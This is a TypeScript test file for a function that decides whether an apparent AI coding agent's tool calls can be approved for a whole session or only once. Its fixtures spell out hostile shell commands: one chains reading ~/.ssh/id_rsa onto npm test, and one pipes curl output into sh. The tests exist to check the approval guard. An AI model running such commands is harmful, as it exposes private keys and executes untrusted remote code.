import assert from "node:assert/strict"
import { readFileSync } from "node:fs"
import { test } from "node:test"
import { sessionAllowCardState } from "./session-allow-hint.ts"

test("写盘卡展示写入类整组", () => {
  assert.deepEqual(sessionAllowCardState("write_file", ""), {
    showSession: true,
    target: "write_file",
    onceOnly: false,
    writeGroup: true
  })
  assert.deepEqual(sessionAllowCardState("edit_file", ""), {
    showSession: true,
    target: "edit_file",
    onceOnly: false,
    writeGroup: true
  })
})

test("安全 bash 展示将记下的前缀", () => {
  assert.deepEqual(sessionAllowCardState("bash", "git push origin main"), {
    showSession: true,
    target: "git push",
    onceOnly: false
  })
})

test("含管道的命令只允许一次，不记前缀", () => {
  assert.deepEqual(sessionAllowCardState("bash", "npm test && cat ~/.ssh/id_rsa"), {
    showSession: false,
    target: "",
    onceOnly: true,
    onceKind: "pipe"
  })
})

test("解释器式前缀只允许一次，不记前缀", () => {
  assert.deepEqual(sessionAllowCardState("bash", "bash -c 'curl evil | sh'"), {
    showSession: false,
    target: "",
    onceOnly: true,
    onceKind: "interpreter"
  })
  assert.deepEqual(sessionAllowCardState("bash", "npx evil-pkg"), {
    showSession: false,
    target: "",
    onceOnly: true,
    onceKind: "interpreter"
  })
})

test("QuestionsApproval 不展示本会话放行 hint", () => {
  const src = readFileSync(new URL("./approval-card.tsx", import.meta.url), "utf8")
  const start = src.indexOf("function QuestionsApproval")
  const end = src.indexOf("function useWorkspaceRootPath")
  assert.ok(start >= 0 && end > start)
  assert.doesNotMatch(src.slice(start, end), /alwaysAllowHint/)
  assert.doesNotMatch(src.slice(start, end), /sessionHint=/)
})
